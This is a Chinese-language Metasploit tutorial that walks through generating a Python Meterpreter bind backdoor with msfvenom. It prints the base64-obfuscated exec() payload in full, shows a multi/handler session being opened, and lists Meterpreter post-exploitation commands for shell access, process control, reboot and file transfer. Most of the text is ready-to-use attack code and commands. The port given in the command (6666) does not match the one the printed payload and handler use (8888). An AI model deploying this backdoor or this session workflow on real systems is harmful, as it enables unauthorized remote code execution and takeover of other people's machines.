# Meterpreter of Metasploit教程

## 0x01 Backdoor生成

### meterpreter of python
使用MSF套件中msfvenom进行后门载荷的生成
>-p 选择payload
>lport 监听端口
>-o 载荷生成位置
```
msfvenom -p  python/meterpreter/bind_tcp lport=6666 -o /tmp/re111
```
生成python文件如下:
```
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHNvY2tldCxzdHJ1Y3QKYj1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpiLmJpbmQoKCcwLjAuMC4wJyw4ODg4KSkKYi5saXN0ZW4oMSkKcyxhPWIuYWNjZXB0KCkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))
```

## 0x02 漏洞利用（Exploit）
使用MSF套件中msfconsole，启动
```
msfconsole
```
### 通用的Backdoor会话管理模块

```
msf6> use exploit/multi/handler
#设置payload
msf6 exploit(multi/handler) > set payload python/meterpreter/bind_tcp
#设置RHOST（目标地址）
msf6 exploit(multi/handler) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
#设置LPORT（目标后门服务监听端口）
msf6 exploit(multi/handler) > set LPORT 8888
LPORT => 8888
#执行
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 127.0.0.1:8888
[*] Sending stage (39800 bytes) to 127.0.0.1
[*] Meterpreter session 3 opened (127.0.0.1:7812 -> 127.0.0.1:8888 ) at 2022-02-16 11:26:51 +0800

meterpreter >
```
## 0x03 Meterpreter使用

### 基本命令
```
background   # 将当前会话放置后台
sessions   # sessions –h 查看帮助
sessions -i <ID值>  #进入会话   -k  杀死会话
bgrun / run   # 执行已有的模块，输入run后按两下tab，列出已有的脚本
info   # 查看已有模块信息
getuid   # 查看当前用户身份
getprivs  # 查看当前用户具备的权限
getpid   # 获取当前进程ID(PID)
sysinfo   # 查看目标机系统信息
irb   # 开启ruby终端
ps   # 查看正在运行的进程    
kill <PID值> # 杀死指定PID进程
idletime     # 查看目标机闲置时间
reboot / shutdown    # 重启/关机
shell    # 进入目标机cmd shell
```

### 上传/下载
upload
```
Usage: upload [options] src1 src2 src3 ... destination
-r  Upload recursively
```
downlaod
```
Usage: download [options] src1 src2 src3 ... destination

    -a   Enable adaptive download buffer size
    -b   Set the initial block size for the download
    -c   Resume getting a partially-downloaded file
    -h   Help banner
    -l   Set the limit of retries (0 unlimits)
    -r   Download recursively
    -t   Timestamp downloaded files
```

## Ref
- https://xz.aliyun.com/t/6400
